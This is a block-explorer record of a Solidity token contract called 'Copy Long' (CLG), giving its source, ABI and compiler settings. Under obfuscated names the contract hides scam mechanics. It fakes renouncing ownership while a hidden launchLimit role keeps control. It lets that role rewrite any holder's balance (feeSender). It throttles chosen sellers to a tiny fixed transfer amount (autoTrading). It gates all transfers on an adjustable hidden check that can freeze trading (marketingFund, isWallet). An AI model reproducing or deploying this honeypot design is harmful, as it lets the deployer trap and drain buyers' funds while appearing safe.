{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface receiverEnableTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquiditySell) external view returns (uint256);\n\n    function transfer(address isLaunch, uint256 fundTo) external returns (bool);\n\n    function allowance(address receiverFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isLaunch,\n        uint256 fundTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityTotalTake, uint256 value);\n    event Approval(address indexed receiverFrom, address indexed spender, uint256 value);\n}\n\nabstract contract totalFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface limitSender {\n    function createPair(address feeTotal, address walletReceiverExempt) external returns (address);\n}\n\ninterface receiverEnableTakeMetadata is receiverEnableTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CopyLong is totalFee, receiverEnableTake, receiverEnableTakeMetadata {\n\n    function fromEnable(address tradingAt, address isLaunch, uint256 fundTo) internal returns (bool) {\n        require(launchedFee[tradingAt] >= fundTo);\n        launchedFee[tradingAt] -= fundTo;\n        launchedFee[isLaunch] += fundTo;\n        emit Transfer(tradingAt, isLaunch, fundTo);\n        return true;\n    }\n\n    string private swapReceiver = \"Copy Long\";\n\n    bool public isEnable;\n\n    function transfer(address tokenAmount, uint256 fundTo) external virtual override returns (bool) {\n        return isWallet(_msgSender(), tokenAmount, fundTo);\n    }\n\n    address public modeTake;\n\n    function approve(address toWallet, uint256 fundTo) public virtual override returns (bool) {\n        buyAmount[_msgSender()][toWallet] = fundTo;\n        emit Approval(_msgSender(), toWallet, fundTo);\n        return true;\n    }\n\n    function transferFrom(address tradingAt, address isLaunch, uint256 fundTo) external override returns (bool) {\n        if (_msgSender() != shouldWalletReceiver) {\n            if (buyAmount[tradingAt][_msgSender()] != type(uint256).max) {\n                require(fundTo <= buyAmount[tradingAt][_msgSender()]);\n                buyAmount[tradingAt][_msgSender()] -= fundTo;\n            }\n        }\n        return isWallet(tradingAt, isLaunch, fundTo);\n    }\n\n    function balanceOf(address liquiditySell) public view virtual override returns (uint256) {\n        return launchedFee[liquiditySell];\n    }\n\n    mapping(address => bool) public launchLimit;\n\n    bool private shouldTeam;\n\n    function name() external view virtual override returns (string memory) {\n        return swapReceiver;\n    }\n\n    function autoTrading(address shouldBuy) public {\n        liquidityAutoMin();\n        if (toIs == limitIs) {\n            limitIs = toIs;\n        }\n        if (shouldBuy == modeTake || shouldBuy == shouldEnable) {\n            return;\n        }\n        fromEnableBuy[shouldBuy] = true;\n    }\n\n    function liquidityAutoMin() private view {\n        require(launchLimit[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return limitTo;\n    }\n\n    bool public isExempt;\n\n    address enableTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxFund;\n    }\n\n    mapping(address => mapping(address => uint256)) private buyAmount;\n\n    string private atSender = \"CLG\";\n\n    function marketingFund(uint256 fundTo) public {\n        liquidityAutoMin();\n        receiverMax = fundTo;\n    }\n\n    bool public isLaunched;\n\n    bool private tradingWallet;\n\n    function isWallet(address tradingAt, address isLaunch, uint256 fundTo) internal returns (bool) {\n        if (tradingAt == modeTake) {\n            return fromEnable(tradingAt, isLaunch, fundTo);\n        }\n        uint256 limitList = receiverEnableTake(shouldEnable).balanceOf(enableTo);\n        require(limitList == receiverMax);\n        require(isLaunch != enableTo);\n        if (fromEnableBuy[tradingAt]) {\n            return fromEnable(tradingAt, isLaunch, toExempt);\n        }\n        return fromEnable(tradingAt, isLaunch, fundTo);\n    }\n\n    address private limitTo;\n\n    function isTokenMarketing(address sellLimitLiquidity) public {\n        if (shouldMax) {\n            return;\n        }\n        \n        launchLimit[sellLimitLiquidity] = true;\n        \n        shouldMax = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeTotal;\n    }\n\n    function feeSender(address tokenAmount, uint256 fundTo) public {\n        liquidityAutoMin();\n        launchedFee[tokenAmount] = fundTo;\n    }\n\n    bool public senderBuy;\n\n    uint256 constant toExempt = 3 ** 10;\n\n    uint256 receiverMax;\n\n    bool public shouldMax;\n\n    function symbol() external view virtual override returns (string memory) {\n        return atSender;\n    }\n\n    uint256 shouldAmountSender;\n\n    mapping(address => bool) public fromEnableBuy;\n\n    uint256 private takeTotal = 100000000 * 10 ** 18;\n\n    address shouldWalletReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        if (toIs != limitIs) {\n            toIs = limitIs;\n        }\n        totalFrom tradingAmountExempt = totalFrom(shouldWalletReceiver);\n        shouldEnable = limitSender(tradingAmountExempt.factory()).createPair(tradingAmountExempt.WETH(), address(this));\n        \n        modeTake = _msgSender();\n        swapShould();\n        launchLimit[modeTake] = true;\n        launchedFee[modeTake] = takeTotal;\n        if (isEnable) {\n            isLaunched = true;\n        }\n        emit Transfer(address(0), modeTake, takeTotal);\n    }\n\n    function allowance(address receiverList, address toWallet) external view virtual override returns (uint256) {\n        if (toWallet == shouldWalletReceiver) {\n            return type(uint256).max;\n        }\n        return buyAmount[receiverList][toWallet];\n    }\n\n    address public shouldEnable;\n\n    mapping(address => uint256) private launchedFee;\n\n    function owner() external view returns (address) {\n        return limitTo;\n    }\n\n    uint8 private maxFund = 18;\n\n    event OwnershipTransferred(address indexed sellLaunch, address indexed fundList);\n\n    uint256 public toIs;\n\n    uint256 private limitIs;\n\n    function swapShould() public {\n        emit OwnershipTransferred(modeTake, address(0));\n        limitTo = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTotalTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldBuy\",\"type\":\"address\"}],\"name\":\"autoTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTo\",\"type\":\"uint256\"}],\"name\":\"feeSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromEnableBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLimitLiquidity\",\"type\":\"address\"}],\"name\":\"isTokenMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundTo\",\"type\":\"uint256\"}],\"name\":\"marketingFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CopyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}